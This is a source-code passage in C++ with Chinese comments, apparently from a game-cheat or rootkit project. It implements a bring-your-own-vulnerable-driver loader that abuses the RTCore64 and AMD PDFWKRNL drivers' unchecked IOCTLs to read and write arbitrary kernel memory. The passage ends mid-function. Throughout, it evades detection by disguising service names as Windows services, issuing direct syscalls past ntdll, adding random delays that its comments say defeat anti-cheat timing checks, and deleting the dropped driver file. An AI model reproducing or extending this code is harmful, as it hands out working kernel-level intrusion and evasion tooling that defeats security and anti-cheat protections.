static bool PdfwReadKernelVA(HANDLE hDevice, uint64_t kernelVA, void* outBuf, size_t size) {
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return false;
    if (size > 0x100000) return false; // 1MB 上限

    PDFW_MEMCPY_REQUEST request = {};
    request.Destination = outBuf;      // 驱动将数据写到 outBuf
    request.Source = (void*)kernelVA;  // 从内核VA读取
    request.Size = (uint32_t)size;

    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDevice, IOCTL_AMDPDFW_MEMCPY,
        &request, sizeof(request),
        &request, sizeof(request),
        &bytesReturned, nullptr);
    return ok && (bytesReturned > 0 || size == 0);
}

// ★ BUILD 489: PDFWKRNL 内核VA写入 — 通过 IOCTL 0x80002014 memcpy
//   驱动内部: memcpy(kernelVA, inBuf, size) — 无安全检查
static bool PdfwWriteKernelVA(HANDLE hDevice, uint64_t kernelVA, const void* inBuf, size_t size) {
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return false;
    if (size > 0x100000) return false;

    PDFW_MEMCPY_REQUEST request = {};
    request.Destination = (void*)kernelVA;  // 驱动将数据写到内核VA
    request.Source = (void*)inBuf;          // 从用户缓冲区读取
    request.Size = (uint32_t)size;

    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDevice, IOCTL_AMDPDFW_MEMCPY,
        &request, sizeof(request),
        &request, sizeof(request),
        &bytesReturned, nullptr);
    return ok && (bytesReturned > 0 || size == 0);
}

bool KernelMemoryAccessor::ReadKernelVA(uint64_t va, void* outBuf, size_t size) {
    if (!m_active) return false;
    if (va < 0xFFFF800000000000ULL) return false;

    // ★ BUILD 489: 根据驱动类型分发
    if (g_isPdfwKrnl) {
        return PdfwReadKernelVA(m_hDevice, va, outBuf, size);
    }
    // ★ v3.124: 使用 PhysicalReadViaIOCTL (0x80002048) — 此RTCore64版本直接将地址作为内核VA处理
    return PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, va, outBuf, size);
}

bool KernelMemoryAccessor::WriteKernelVA(uint64_t va, const void* inBuf, size_t size) {
    if (!m_active) return false;
    if (va < 0xFFFF800000000000ULL) return false;

    // ★ BUILD 489: 根据驱动类型分发
    if (g_isPdfwKrnl) {
        return PdfwWriteKernelVA(m_hDevice, va, inBuf, size);
    }
    // ★ v3.124: 使用 PhysicalWriteViaIOCTL (0x8000204C) — 直接内核VA写入
    return PhysicalWriteViaIOCTL(m_hDevice, g_probedWriteIoctl, va, inBuf, size);
}

// ============================================================
// 内核模块基址解析
// ============================================================

uint64_t KernelMemoryAccessor::GetNtoskrnlBase() {
    if (m_ntosBase) return m_ntosBase;
    m_ntosBase = GetKernelModuleBase("ntoskrnl.exe");
    return m_ntosBase;
}

// ★ v3.116: 使用 VirtualAlloc 替代 std::vector — 避免手动映射 DLL 上下文中 CRT 堆未初始化导致崩溃
//   修复 SYSTEM_MODULE_ENTRY 结构偏移: ImageName 在 +0x28, 非 +0x2C; 条目大小 0x128 非 0x12C
//   参数改为 const char* — 避免调用方构造临时 std::string (CRT 堆分配可能失败)
uint64_t KernelMemoryAccessor::GetKernelModuleBase(const char* moduleName) {
    typedef LONG(NTAPI* NtQuerySystemInfo_t)(ULONG, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;
    auto pNtQsi = (NtQuerySystemInfo_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!pNtQsi) return 0;

    // 使用 VirtualAlloc 替代 std::vector — 不依赖 CRT 堆
    ULONG bufSize = 0x1000;
    BYTE* buf = nullptr;

    for (int retry = 0; retry < 3; retry++) {
        if (buf) VirtualFree(buf, 0, MEM_RELEASE);
        buf = (BYTE*)VirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) {
            ByovdDiag("BYOVD:GetKernelModuleBase: VirtualAlloc(%u) FAILED\n", bufSize);
            return 0;
        }
        ULONG retLen = 0;
        LONG status = pNtQsi(11, buf, bufSize, &retLen);
        if (NT_SUCCESS(status)) break;
        if (status != 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
            ByovdDiag("BYOVD:GetKernelModuleBase: NtQSI FAILED status=0x%08X\n", status);
            VirtualFree(buf, 0, MEM_RELEASE);
            return 0;
        }
        bufSize = retLen + 0x1000;
    }

    if (!buf) return 0;

    // SYSTEM_MODULE_INFORMATION (Windows 10/11 x64):
    //   ULONG Count + SYSTEM_MODULE_ENTRY[Count]
    // SYSTEM_MODULE_ENTRY:
    //   +0x00: HANDLE  Section        (8 bytes)
    //   +0x08: PVOID   MappedBase     (8 bytes) — 内核模块映射基址 (用于读取)
    //   +0x10: PVOID   ImageBase      (8 bytes)
    //   +0x18: ULONG   ImageSize      (4 bytes)
    //   +0x1C: ULONG   Flags          (4 bytes)
    //   +0x20: USHORT  LoadOrderIndex  (2 bytes)
    //   +0x22: USHORT  InitOrderIndex  (2 bytes)
    //   +0x24: USHORT  LoadCount       (2 bytes)
    //   +0x26: USHORT  OffsetToFileName (2 bytes)
    //   +0x28: CHAR    FullPathName[256]
    //   条目总大小: 0x128 (296) 字节
    ULONG count = *(ULONG*)buf;
    uintptr_t entryPtr = (uintptr_t)buf + sizeof(ULONG);
    const size_t entrySize = 0x128; // 296 bytes

    uint64_t result = 0;
    for (ULONG i = 0; i < count; i++) {
        // FullPathName 在 +0x28
        const char* fullPath = (const char*)(entryPtr + 0x28);
        // 从完整路径中提取文件名 (最后一个反斜杠后)
        const char* baseName = strrchr(fullPath, '\\');
        if (!baseName) baseName = fullPath;
        else baseName++;

        if (_stricmp(baseName, moduleName) == 0) {
            // MappedBase 在 +0x08
            result = *(uint64_t*)(entryPtr + 0x08);
            ByovdDiag("BYOVD:GetKernelModuleBase: found %s at 0x%llX (entry=%zu)\n",
                      baseName, (unsigned long long)result, i);
            break;
        }

        entryPtr += entrySize;
    }

    VirtualFree(buf, 0, MEM_RELEASE);

    if (result) return result;

    // 回退: 尝试 EnumDeviceDrivers
    LPVOID drivers[1024];
    DWORD cbNeeded = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        int driverCount = cbNeeded / sizeof(LPVOID);
        ByovdDiag("BYOVD:GetKernelModuleBase: fallback EnumDeviceDrivers, %d drivers\n", driverCount);
        for (int i = 0; i < driverCount; i++) {
            char baseName[256] = {};
            DWORD nameLen = GetDeviceDriverBaseNameA(drivers[i], baseName, sizeof(baseName));
            if (nameLen > 0) {
                if (_stricmp(baseName, moduleName) == 0) {
                    ByovdDiag("BYOVD:GetKernelModuleBase: fallback found %s at 0x%p\n", baseName, drivers[i]);
                    return (uint64_t)drivers[i];
                }
            }
        }
    }

    ByovdDiag("BYOVD:GetKernelModuleBase: '%s' NOT FOUND\n", moduleName);
    return 0;
}

// ★ BUILD 496: 移除 std::string 重载 — 仅保留 const char* 版本
// (原 std::string 重载已删除, 调用方直接传 const char*)

// ============================================================
// 初始化 / 清理
// ============================================================

bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
    ByovdDiag("BYOVD:Init: ENTER (driverPath='%ls' svcName='%ls')\n",
        driver.driverPath, driver.serviceName);
    m_driverInfo = driver;
    ByovdDiag("BYOVD:Init: m_driverInfo copied OK\n");

    // ★ BUILD 489: 检测驱动类型, 设置全局标志
    g_isPdfwKrnl = (driver.ioctlCode == IOCTL_AMDPDFW_MEMCPY);
    ByovdDiag("BYOVD:Init: driver type=%s ioctl=0x%08X\n",
        g_isPdfwKrnl ? "PDFWKRNL" : "RTCore64", driver.ioctlCode);

    // 1. 检测 HVCI
    if (IsHVCIEnabled()) {
        ByovdDiag("BYOVD:Init: HVCI ENABLED (will likely block driver load)\n");
    }
    ByovdDiag("BYOVD:Init: HVCI check done\n");

    // ★ BUILD 474: 优先复用已有驱动 — 在 stale service 清理之前
    //   - BUILD 472/473 在调用 NtUnloadDriver 时崩溃 (手动映射 DLL 上下文)
    //   - 修复: 先设置 IOCTL 码再 ReadKernelVA (BUILD 473 漏了这一步)
    //   - 修复: 即使 early probe 失败, 也不 fallthrough 到 stale 清理 — 跳过 NtUnloadDriver
    ByovdDiag("BYOVD:Init: BUILD 474 early probe for %ls...\n",
        m_driverInfo.devicePath);

    m_hDevice = CreateFileW(m_driverInfo.devicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);

    if (m_hDevice != INVALID_HANDLE_VALUE) {
        ByovdDiag("BYOVD:Init: early probe opened, setting IOCTL + testing...\n");
        // ★ BUILD 489: 根据驱动类型设置 IOCTL 码
        if (g_isPdfwKrnl) {
            g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
            g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;
        } else {
            g_probedReadIoctl = IOCTL_PHYSICAL_READ;   // 0x80002048
            g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;  // 0x8000204C
        }

        m_active = true;
        m_ntosBase = GetNtoskrnlBase();
        if (m_ntosBase) {
            uint16_t magic = 0;
            bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
            if (probeOk && magic == 0x5A4D) {
                ByovdDiag("BYOVD:Init: reusing existing device OK (ntos=0x%llX), skip cleanup+load\n",
                    (unsigned long long)m_ntosBase);
                return true;
            }
            ByovdDiag("BYOVD:Init: early probe IOCTL FAIL (magic=0x%04X), device=zombie\n", magic);
        }
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
        m_active = false;
        // ★ BUILD 474: device 存在但 IOCTL 失败 → 僵尸设备
        //   不 fallthrough — 跳过 stale 清理和加载, 直接让调用方处理
        ByovdDiag("BYOVD:Init: zombie device detected, aborting (not calling UnloadDriver)\n");
        return false;
    }
    ByovdDiag("BYOVD:Init: early probe no device (err=%u), will load fresh\n", GetLastError());

    // ★ BUILD 486: 在 Initialize 早期缓存 Nt* SSN — 此时 kernel32→ntdll 调用链仍安全.
    //   后续 LoadDriver 使用这些缓存的 SSN 生成 syscall stubs, 完全绕过 ntdll 包装函数,
    //   避免 Win11 CFG 在 manual-mapped DLL 上下文中阻止 ntdll 间接调用.
    if (!g_cachedSsnCreateKey || !g_cachedSsnLoadDriver) {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll) {
            auto extractSsn = [](HMODULE mod, const char* name) -> DWORD {
                auto* addr = reinterpret_cast<BYTE*>(GetProcAddress(mod, name));
                if (!addr) return 0;
                // 标准 x64 Nt* 开头: 4C 8B D1 B8 XX XX XX XX (mov r10,rcx; mov eax,SSN)
                if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8)
                    return *reinterpret_cast<DWORD*>(addr + 4);
                // 回退: 搜索 mov eax, imm32 模式
                for (int i = 0; i < 32; i++) {
                    if (addr[i] == 0xB8) return *reinterpret_cast<DWORD*>(addr + i + 1);
                    if (addr[i] == 0x0F && addr[i + 1] == 0x05) break;
                    if (addr[i] == 0xC3) break;
                }
                return 0;
            };
            g_cachedSsnCreateKey   = extractSsn(hNtdll, "NtCreateKey");
            g_cachedSsnOpenKey     = extractSsn(hNtdll, "NtOpenKey");
            g_cachedSsnSetValueKey = extractSsn(hNtdll, "NtSetValueKey");
            g_cachedSsnLoadDriver  = extractSsn(hNtdll, "NtLoadDriver");
            // ★ BUILD 490: EnablePrivilege 直接 syscall
            g_cachedSsnOpenProcessToken      = extractSsn(hNtdll, "NtOpenProcessToken");
            g_cachedSsnAdjustPrivilegesToken = extractSsn(hNtdll, "NtAdjustPrivilegesToken");
            ByovdDiag("BYOVD:Init: cached Nt* SSN: CK=%u OK=%u SV=%u LD=%u OPT=%u APT=%u\n",
                g_cachedSsnCreateKey, g_cachedSsnOpenKey,
                g_cachedSsnSetValueKey, g_cachedSsnLoadDriver,
                g_cachedSsnOpenProcessToken, g_cachedSsnAdjustPrivilegesToken);
        }
    }

    // 2. 确保驱动文件存在 (System32\drivers → 嵌入提取到 %TEMP%)
    ByovdDiag("BYOVD:Init: calling EnsureDriverFile('%ls')...\n", driver.driverPath);
    const wchar_t* resolvedPath = EnsureDriverFile(driver.driverPath);
    ByovdDiag("BYOVD:Init: EnsureDriverFile returned '%ls'\n", resolvedPath ? resolvedPath : L"(null)");
    const wchar_t* actualPath = resolvedPath ? resolvedPath : driver.driverPath;

    // ★ v3.110: 彻底随机化服务名 — 使用完全随机的12字符名称
    //   不再使用 "RTCore64Svc_XXXX" 模式 (含 "RTCore64" 是强特征)
    static const wchar_t* svcPrefixes[] = {
        L"UxUpdateSvc", L"WdiService", L"FontCacheSvc",
        L"ProfSvc", L"WpnService", L"BthAvctpSvc",
        L"WlanSvc", L"TabletInputSvc", L"LicenseManager",
        L"NgcSvc", L"PushNotifySvc", L"RmSvc",
        L"EventLogSvc", L"PowerSvc", L"BrokerInfraSvc",
        L"ClipSvc", L"ConsentUxSvc", L"DeviceAssocSvc",
        L"DevicePickerSvc", L"DevQueryBroker", L"DsmsSvc",
        L"DmEnrollmentSvc", L"EmbeddedModeSvc", L"MessagingSvc",
        L"NetSetupSvc", L"PcaSvc", L"PerfHostSvc",
        L"PhoneSvc", L"PrintWorkflowSvc", L"PimIndexMaintenanceSvc",
    };
    static const int svcPrefixCount = sizeof(svcPrefixes) / sizeof(svcPrefixes[0]);
    static bool seeded = false;
    if (!seeded) { srand(GetTickCount() ^ __rdtsc()); seeded = true; }
    const wchar_t* chosenPrefix = svcPrefixes[rand() % svcPrefixCount];
    wchar_t svcName[64];
    swprintf_s(svcName, L"%ls_%04X", chosenPrefix, (rand() & 0xFFFF));
    // ★ BUILD 496: 固定数组替代 std::wstring
    wcscpy_s(m_actualServiceName, svcName);

    // v3.95: 扫描注册表, 卸载所有残留的 RTCore64/SysMon 服务
    //        避免 STATUS_OBJECT_NAME_COLLISION (0xC0000035)
    // ★ v3.113: 每个残留服务最多重试 3 次, 防止 RegDeleteTreeW 失败时的无限循环
    // ★ v3.113: 随机化前缀必须匹配 _XXXX 后缀, 避免误删合法系统服务 (如 NetSetupSvc)
    {
        HKEY hServices;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Services", 0,
            KEY_ENUMERATE_SUB_KEYS | DELETE, &hServices) == ERROR_SUCCESS)
        {
            wchar_t subKeyName[256];
            wchar_t prevKey[256] = {};
            int sameKeyRetries = 0;
            DWORD idx = 0;
            while (idx < 512) {
                DWORD nameLen = 256;
                LONG enumResult = RegEnumKeyExW(hServices, idx, subKeyName, &nameLen,
                    nullptr, nullptr, nullptr, nullptr);
                if (enumResult != ERROR_SUCCESS) break;
                // 匹配 RTCore64Svc/SysMon/PdfwKrnlSvc (旧格式, 直接匹配)
                bool isStaleSvc = (wcsstr(subKeyName, L"RTCore64Svc") == subKeyName)
                               || (wcsstr(subKeyName, L"SysMon") == subKeyName)
                               || (wcsstr(subKeyName, L"PdfwKrnlSvc") == subKeyName);  // ★ BUILD 489
                // ★ v3.110: 也匹配新的随机化服务名前缀
                // ★ v3.113: 必须检查 _XXXX 后缀, 防止误匹配合法系统服务
                if (!isStaleSvc) {
                    size_t subKeyLen = wcslen(subKeyName);
                    for (int p = 0; p < svcPrefixCount; p++) {
                        size_t prefixLen = wcslen(svcPrefixes[p]);
                        // 服务名必须 完整匹配前缀 + 下划线 + 4位十六进制数
                        if (subKeyLen == prefixLen + 5 &&
                            wcsncmp(subKeyName, svcPrefixes[p], prefixLen) == 0 &&
                            subKeyName[prefixLen] == L'_')
                        {
                            // 验证后4位是十六进制数字
                            bool hexOk = true;
                            for (int h = 1; h <= 4; h++) {
                                wchar_t c = subKeyName[prefixLen + h];
                                if (!((c >= L'0' && c <= L'9') || (c >= L'A' && c <= L'F') || (c >= L'a' && c <= L'f'))) {
                                    hexOk = false; break;
                                }
                            }
                            if (hexOk) { isStaleSvc = true; break; }
                        }
                    }
                }
                if (isStaleSvc) {
                    // ★ BUILD 497: wcscmp 替代 std::wstring 比较 — 避免 CRT 堆依赖
                    // 跳过当前要加载的服务名
                    if (wcscmp(subKeyName, m_actualServiceName) == 0) { idx++; continue; }
                    // ★ v3.113: 检测是否反复处理同一个键, 防止无限循环
                    if (wcscmp(subKeyName, prevKey) == 0) {
                        sameKeyRetries++;
                        if (sameKeyRetries >= 3) {
                            ByovdDiag("BYOVD:Init: stale '%ls' retry limit, skipping\n", subKeyName);
                            idx++;
                            sameKeyRetries = 0;
                            prevKey[0] = 0;
                            continue;
                        }
                    } else {
                        sameKeyRetries = 0;
                        wcscpy_s(prevKey, subKeyName);
                    }
                    // ★ BUILD 474: 跳过 UnloadDriver — manual-mapped DLL 上下文中
                    //   NtUnloadDriver 在 ntdll 中 ACCESS_VIOLATION, 无法安全调用.
                    //   驱动已不在内核 (stale = 从未加载/已卸载), 直接删注册表即可.
                    ByovdDiag("BYOVD:Init: found stale service '%ls', deleting registry key (skip UnloadDriver)\n", subKeyName);
                    RegDeleteTreeW(hServices, subKeyName);
                    // 不要 idx++ — 删除后索引会变, 重新从 idx 开始
                } else {
                    idx++;
                }
            }
            RegCloseKey(hServices);
        }
    }

    // ★ v3.94: 先尝试直接打开已有设备 (可能是 zombie 但仍可用)
    //   避免 crashy 的 NtOpenDirectoryObject/NtQueryDirectoryObject 枚举
    ByovdDiag("BYOVD:Init: v3.94 probing for existing device %ls...\n",
        m_driverInfo.devicePath);

    m_hDevice = CreateFileW(m_driverInfo.devicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);

    if (m_hDevice != INVALID_HANDLE_VALUE) {
        // ★ v3.114: 已有设备, 直接用默认 IOCTL 码测试内核读取
        // ★ BUILD 489: 根据驱动类型设置 IOCTL 码
        ByovdDiag("BYOVD:Init: existing device opened, testing with default IOCTL 0x%08X...\n",
            m_driverInfo.ioctlCode);
        if (g_isPdfwKrnl) {
            g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
            g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;
        } else {
            g_probedReadIoctl = IOCTL_PHYSICAL_READ;
            g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;
        }
        m_active = true;
        m_ntosBase = GetNtoskrnlBase();
        if (m_ntosBase) {
            uint16_t magic = 0;
            bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
            if (probeOk && magic == 0x5A4D) {
                ByovdDiag("BYOVD:Init: reusing existing device OK (ntos=0x%llX, ioctl=0x%08X)\n",
                    (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);
                return true;
            }
            ByovdDiag("BYOVD:Init: existing device kernel read FAILED (magic=0x%04X)\n", magic);
        }
        // ★ v3.96: 僵尸设备 — IOCTL 不可用, 设备对象残留但无驱动
        // ★ BUILD 463: 四步彻底清理
        ByovdDiag("BYOVD:Init: ZOMBIE DEVICE DETECTED — attempting force cleanup...\n");

        // 0. NtMakeTemporaryObject — 移除 OBJ_PERMANENT, 关闭句柄后设备对象自动释放
        {
            static auto pNtMakeTemp = (NTSTATUS(NTAPI*)(HANDLE))
                GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtMakeTemporaryObject");
            if (pNtMakeTemp) {
                NTSTATUS st = pNtMakeTemp(m_hDevice);
                ByovdDiag("BYOVD:Init: NtMakeTemporaryObject(zombie) → 0x%08X\n", (uint32_t)st);
            }
        }
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
        m_active = false;

        // 1. 强制移除所有残留的 RTCore64/SysMon 服务
        ForceRemoveRTCore64Services();

        // 2. 删除 DOS 设备符号链接
        // ★ BUILD 489: 根据驱动类型使用正确的设备名
        DefineDosDeviceW(DDD_REMOVE_DEFINITION,
            g_isPdfwKrnl ? L"PdfwKrnl" : L"RTCore64", nullptr);

        // 3. 短暂等待内核释放设备对象
        Sleep(500);

        ByovdDiag("BYOVD:Init: zombie cleanup done, will retry load\n");
    } else {
        ByovdDiag("BYOVD:Init: no existing device (err=%u), will try to load\n", GetLastError());
    }

    // ★ v3.110: 随机延迟 500-3000ms 后加载驱动, 打破 EAC 时序模式检测
    {
        DWORD delayMs = 500 + (rand() % 2501);
        ByovdDiag("BYOVD:Init: random delay %ums before load\n", delayMs);
        Sleep(delayMs);
    }

    // 4. 加载驱动
    // ★ v3.96: 使用原始未修改驱动 + 原始设备名 \\.\RTCore64.
    //   僵尸设备检测后需重启系统清除, 正常流程通过 Shutdown() 的
    //   SERVICE_CONTROL_STOP 确保 DriverUnload → IoDeleteDevice 清理.
    ByovdDiag("BYOVD:Init: loading %ls (path=%ls)\n", m_actualServiceName, actualPath);
    bool loadOk = LoadDriver(m_actualServiceName, actualPath);
    ByovdDiag("BYOVD:Init: LoadDriver → %d\n", (int)loadOk);

    if (!loadOk) {
        // ★ BUILD 460: 加载失败可能因为 zombie 清理后设备冲突,
        //   再试一次 DefineDosDeviceW 清理 + 短延迟 + 重试
        static bool zombieRetried = false;
        if (!zombieRetried) {
            zombieRetried = true;
            ByovdDiag("BYOVD:Init: LoadDriver failed, trying zombie cleanup retry...\n");
            DefineDosDeviceW(DDD_REMOVE_DEFINITION,
                g_isPdfwKrnl ? L"PdfwKrnl" : L"RTCore64", nullptr);  // ★ BUILD 489
            Sleep(1000);
            loadOk = LoadDriver(m_actualServiceName, actualPath);
            ByovdDiag("BYOVD:Init: LoadDriver retry → %d\n", (int)loadOk);
        }
    }

    if (!loadOk) {
        // ★ v3.95: NtLoadDriver 失败 — 可能是僵尸设备名冲突
        //   尝试用 DefineDosDeviceW 重建符号链接后打开设备
        //   从 devicePath (如 \\.\RT64_A1B2) 提取 DOS 名和 NT 设备名
        // ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
        const wchar_t* devPath = m_driverInfo.devicePath;
        wchar_t dosName[128] = {};
        wchar_t ntDevName[128] = {};
        if (wcslen(devPath) > 4 && wcsncmp(devPath, L"\\\\.\\", 4) == 0) {
            wcscpy_s(dosName, devPath + 4);              // e.g. "RT64_A1B2"
            swprintf_s(ntDevName, L"\\Device\\%ls", dosName); // e.g. "\\Device\\RT64_A1B2"
        } else {
            wcscpy_s(dosName, g_isPdfwKrnl ? L"PdfwKrnl" : L"RTCore64");     // ★ BUILD 489
            wcscpy_s(ntDevName, g_isPdfwKrnl ? L"\\Device\\PdfwKrnl" : L"\\Device\\RTCore64");
        }

        ByovdDiag("BYOVD:Init: LoadDriver FAILED, trying symlink fix: '%ls' → '%ls'\n",
            dosName, ntDevName);

        if (DefineDosDeviceW(DDD_RAW_TARGET_PATH, dosName, ntDevName)) {
            ByovdDiag("BYOVD:Init: DefineDosDeviceW OK, trying to open...\n");
            m_hDevice = CreateFileW(m_driverInfo.devicePath,
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, 0, nullptr);
            if (m_hDevice != INVALID_HANDLE_VALUE) {
                // ★ BUILD 489: 根据驱动类型设置 IOCTL 码
                ByovdDiag("BYOVD:Init: zombie device opened after symlink fix, testing IOCTL 0x%08X...\n",
                    m_driverInfo.ioctlCode);
                if (g_isPdfwKrnl) {
                    g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
                    g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;
                } else {
                    g_probedReadIoctl = IOCTL_PHYSICAL_READ;
                    g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;
                }
                m_active = true;
                m_ntosBase = GetNtoskrnlBase();
                if (m_ntosBase) {
                    uint16_t magic = 0;
                    bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
                    if (probeOk && magic == 0x5A4D) {
                        ByovdDiag("BYOVD:Init: zombie device IOCTL OK (ntos=0x%llX, ioctl=0x%08X)\n",
                            (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);
                        return true;
                    }
                    ByovdDiag("BYOVD:Init: zombie device IOCTL FAILED (magic=0x%04X)\n", magic);
                }
                ByovdDiag("BYOVD:Init: ZOMBIE DEVICE DETECTED — reboot required to clear\n");
                CloseHandle(m_hDevice);
                m_hDevice = INVALID_HANDLE_VALUE;
                m_active = false;
            } else {
                ByovdDiag("BYOVD:Init: still cannot open after symlink fix (err=%u)\n", GetLastError());
            }
        } else {
            ByovdDiag("BYOVD:Init: DefineDosDeviceW FAILED (err=%u)\n", GetLastError());
        }

        ByovdDiag("BYOVD:Init: all attempts failed, giving up\n");
        UnloadDriver(m_actualServiceName);
        return false;
    }
    ByovdDiag("BYOVD:Init: LoadDriver OK\n");

    // 5. 打开设备
    m_hDevice = CreateFileW(m_driverInfo.devicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);

    if (m_hDevice == INVALID_HANDLE_VALUE) {
        ByovdDiag("BYOVD:Init: CreateFileW FAILED for %ls (err=%u)\n",
            m_driverInfo.devicePath, GetLastError());
        UnloadDriver(m_actualServiceName);
        return false;
    }
    ByovdDiag("BYOVD:Init: device opened OK\n");

    // ★ v3.119: 在驱动加载后延迟 500ms, 让驱动内部稳定, 避免 BSOD
    //   某些 Windows 版本在加载 RTCore64 后立即发送 IOCTL 会导致内核崩溃
    Sleep(500);
    ByovdDiag("BYOVD:Init: post-load delay done\n");

    // ★ v3.118: 精确定位BSOD位置 — 分步日志
    ByovdDiag("BYOVD:Init: STEP_A calling GetNtoskrnlBase...\n");
    // ★ v3.116: SEH 已移除 — GetKernelModuleBase 内部已用 VirtualAlloc 替代 std::vector
    //   且返回 0 表示失败, 无需额外异常保护
    m_ntosBase = GetNtoskrnlBase();
    ByovdDiag("BYOVD:Init: STEP_A1 GetNtoskrnlBase returned 0x%llX\n",
              (unsigned long long)m_ntosBase);
    ByovdDiag("BYOVD:Init: STEP_B ntos=0x%llX, ioctl=0x%08X\n",
              (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);

    // ★ BUILD 489: 根据驱动类型选择 IOCTL 探测方式
    //   PDFWKRNL: 使用 IOCTL 0x80002014 memcpy 直接读写内核VA
    //   RTCore64: 使用 IOCTL 0x80002048 (PhysicalReadViaIOCTL) 直接读写内核VA
    ByovdDiag("BYOVD:Init: STEP_B1 probing IOCTL (type=%s)...\n",
        g_isPdfwKrnl ? "PDFWKRNL" : "RTCore64");
    {
        if (g_isPdfwKrnl) {
            // ★ BUILD 489: PDFWKRNL — 使用 memcpy IOCTL
            g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
            g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;  // 同一个 IOCTL, 方向由参数决定
            g_useVirtualIOCTL = false;

            uint8_t testBuf[8] = {};
            bool ok = PdfwReadKernelVA(m_hDevice, m_ntosBase, testBuf, 2);
            DWORD err = GetLastError();
            uint16_t magic = *(uint16_t*)testBuf;
            ByovdDiag("BYOVD:Init: PDFW IOCTL 0x%08X read ntos+0x0 ok=%d err=%u magic=0x%04X (expect 0x5A4D)\n",
                      IOCTL_AMDPDFW_MEMCPY, (int)ok, err, magic);
            if (ok && magic == 0x5A4D) {
                ByovdDiag("BYOVD:Init: PDFW IOCTL OK — kernel VA memcpy R/W\n");
            } else {
                ByovdDiag("BYOVD:Init: PDFW IOCTL FAILED — driver unusable\n");
                CloseHandle(m_hDevice);
                m_hDevice = INVALID_HANDLE_VALUE;
                UnloadDriver(m_actualServiceName);
                return false;
            }
        } else {
            // 直接设置 IOCTL 码
            g_probedReadIoctl = IOCTL_PHYSICAL_READ;   // 0x80002048
            g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;  // 0x8000204C
            g_useVirtualIOCTL = false;

            // 从 ntoskrnl 头部读取 MZ 签名验证 IOCTL 可用
            uint8_t testBuf[8] = {};
            bool ok = PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, m_ntosBase, testBuf, 2);
            DWORD err = GetLastError();
            uint16_t magic = *(uint16_t*)testBuf;
            ByovdDiag("BYOVD:Init: IOCTL 0x%08X read ntos+0x0 ok=%d err=%u magic=0x%04X (expect 0x5A4D)\n",
                      g_probedReadIoctl, (int)ok, err, magic);
            if (ok && magic == 0x5A4D) {
                ByovdDiag("BYOVD:Init: IOCTL 0x%08X OK — kernel VA R/W via physical IOCTL\n",
                          g_probedReadIoctl);
            } else {
                ByovdDiag("BYOVD:Init: IOCTL 0x%08X FAILED — driver unusable\n",
                          g_probedReadIoctl);
                CloseHandle(m_hDevice);
                m_hDevice = INVALID_HANDLE_VALUE;
                UnloadDriver(m_actualServiceName);
                return false;
            }
        }
    }

    // ★ v3.110: 驱动加载成功, 立即删除临时文件抹除磁盘痕迹
    if (actualPath && actualPath[0]) {
        ByovdDiag("BYOVD:Init: STEP_C deleting temp file '%ls'...\n", actualPath);
        if (DeleteFileW(actualPath)) {
            ByovdDiag("BYOVD:Init: STEP_C deleted OK\n");
        } else {
            // ★ v3.126o: 修复 — 检查删除失败 (AV 锁定 / 权限不足)
            DWORD err = GetLastError();
            ByovdDiag("BYOVD:Init: STEP_C delete FAILED err=%d, retrying with MOVEFILE_DELAY_UNTIL_REBOOT\n", (int)err);
            MoveFileExW(actualPath, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
        }
    }

    m_active = true;
    ByovdDiag("BYOVD:Init: STEP_D m_active=true, verifying IOCTL...\n");

    // ★ BUILD 489: 验证 IOCTL R/W 可用 — 根据驱动类型使用对应方法
    {
        uint8_t testBuf[8] = {};
        bool ok;
        if (g_isPdfwKrnl) {
